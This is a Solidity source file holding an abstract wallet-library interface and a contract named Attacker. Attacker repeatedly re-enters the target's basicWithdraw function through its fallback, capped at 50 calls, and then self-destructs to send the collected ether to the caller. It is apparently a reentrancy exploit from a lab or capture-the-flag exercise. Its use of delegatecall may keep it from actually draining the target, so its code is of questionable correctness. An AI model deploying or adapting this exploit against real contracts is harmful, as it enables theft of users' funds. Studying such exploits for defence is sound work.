pragma solidity ^0.4.17;

contract CommonWalletLibraryAbstract {
    address[] public authorizedUsers;
    address public additionalAuthorizedContract;
    uint public lastUpdated;
    address owner;
    
    function() public payable { }
    
    modifier onlyOnce() {
        require(owner == 0x0);
        _;
    }
       
    modifier recordAction() {
        lastUpdated = now;
        _;
    }
    
    function addToReserve() payable recordAction external returns (uint) {}

    function initializeVault() onlyOnce {}

    function basicWithdraw() {}

    function resolve() {}

}

contract Attacker {
    // limit the recursive calls to prevent out-of-gas error
    uint public stack = 0;
    uint constant stackLimit = 50;
    CommonWalletLibraryAbstract wallet;

    function getBalance() returns (uint) {
        return this.balance;
    }

    function Attacker(address tdvaultAddress) payable {
        wallet = CommonWalletLibraryAbstract(tdvaultAddress);
    }

    function attack() {
        wallet.delegatecall(bytes4(sha3("basicWithdraw()")));
    }

    // fallback function
    function() payable {
        if(stack++ < stackLimit) {
            wallet.delegatecall(bytes4(sha3("basicWithdraw()")));
        }
    }

    function resolve() {
        selfdestruct(msg.sender);
    }
}